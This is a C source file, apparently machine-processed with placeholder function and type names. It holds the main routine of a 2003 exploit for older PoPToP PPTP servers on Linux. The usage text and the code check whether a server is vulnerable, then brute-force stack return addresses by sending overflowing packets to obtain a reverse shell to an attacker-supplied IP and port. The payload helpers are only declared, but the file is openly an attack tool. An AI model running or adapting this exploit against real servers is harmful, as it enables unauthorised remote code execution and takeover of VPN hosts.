#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {int /*<<< orphan*/  ctrl_type; int /*<<< orphan*/  length; } ;
struct TYPE_4__ {TYPE_1__ header; } ;
typedef  TYPE_2__ pptp_reply ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int WORD ;
typedef  int DWORD ;

/* Variables and functions */
 int BOTTOMOFSTACK ; 
 int SOCKET_ERROR ; 
 scalar_t__ STEP ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int TOPOFSTACK ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int FUNC5 (int /*<<< orphan*/ ) ; 
 int FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int FUNC8 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,int,char*,int) ; 
 int /*<<< orphan*/  st ; 

int FUNC11(int argc, char** argv)
{
        FUNC7("\n");
        FUNC7("                   D  H     H                            \n");
        FUNC7("                   D  H     H     T\n");
        FUNC7("                   D  H  H  H     T     EE    AA   M   M \n");
        FUNC7("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        FUNC7("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        FUNC7("             D     D  H     H     T    EEE   AAAA  M M M \n");
        FUNC7("              D    D  H     H     T    E     A  A  M   M \n");
        FUNC7("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        FUNC7(" ... presents ... \n\n");
  FUNC7("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        FUNC7("by .einstein., April 2003.\n");
        FUNC7("\n");
  if (argc < 2)
  {
                FUNC7("usage: \n");
                FUNC7("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",argv[0]);
                FUNC7("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
                FUNC7("      you want to attack.  Port 1723 is used for connection\n");
                FUNC7("    <your_ip> and <your_port> - specify an ip address to which\n");
                FUNC7("      a connection is possible to port <your_port> and set up a\n");
                FUNC7("      netcat listener. You'll get a reverse shell.\n");
                FUNC7("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
                FUNC7("   If you only pass a single parameter, the program will check\n");
                FUNC7("   whether remote server is vulnerable or not. Otherwise it will\n");
                FUNC7("   perform a ret bruteforce.\n");
                FUNC7("usage examples:\n");
                FUNC7("  %s 192.168.1.2 192.168.1.1 5555\n",argv[0]);
                FUNC7("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
          FUNC7("  %s 127.0.0.1 127.0.0.1 6666 100\n",argv[0]);
                FUNC7("    attack a locally running pptpd with a timeout of 100 ms\n");
                FUNC7("    and get a shell on port 6666.\n");
                FUNC7("  %s 192.168.1.56\n",argv[0]);
                FUNC7("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
    return 0;
        }


  int timeout = 500;
  if (argc >= 5) timeout = FUNC2(argv[4]);

        // init winsock
        WORD version=0x0101;
  WSADATA data;
  FUNC1(version,&data);

        DWORD ret;
        if (argc == 2)
        {
                if (!FUNC4(argv[1])) return 1;

                FUNC7("\nChecking if the server is vulnerable..\n");
                FUNC7("(if it is you have to wait 65 seconds)..\n");
                FUNC9(st);

                ret = 0x01010101;
                int bytes;
                pptp_reply reply;
                        
                //header length
                bytes = FUNC8(st,(char*)&reply,2,0);
                bytes = FUNC6(reply.header.length);
                bytes = FUNC8(st,(char*)&reply+2,bytes-2,0);
                int j = FUNC5(reply.header.ctrl_type);
                FUNC10(st,ret,"0.0.0.0",0);
                        
                //header length
                bytes = FUNC8(st,(char*)&reply,2,0);
                FUNC7("PoPToP server is ");
                if (bytes != SOCKET_ERROR) FUNC7("vulnerable!\n");
                else FUNC7("not vulnerable\n");
                FUNC3(st);

                return 1;
        }

        FUNC7("[!] Attempting bruteforce against %s\n",argv[1]);
        FUNC7("interrupt when you get a shell to %s on port %d...\n\n",argv[2],FUNC2(argv[3]));
        
        int checked = 0;
        
        for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP)
        {
          FUNC7("[*] ");
                if (!FUNC4(argv[1])) return 1;
        FUNC7("[ret=0x%x]..",ret);
        FUNC7("sending payload..");
        
                // initial packet
                FUNC9(st);

                //a real overflowing ping packet
          FUNC10(st,ret,argv[2],FUNC2(argv[3]));
                FUNC3(st);

                FUNC0(timeout);
                FUNC7("done\n");
        
                
        
        }
        
        return 0;
}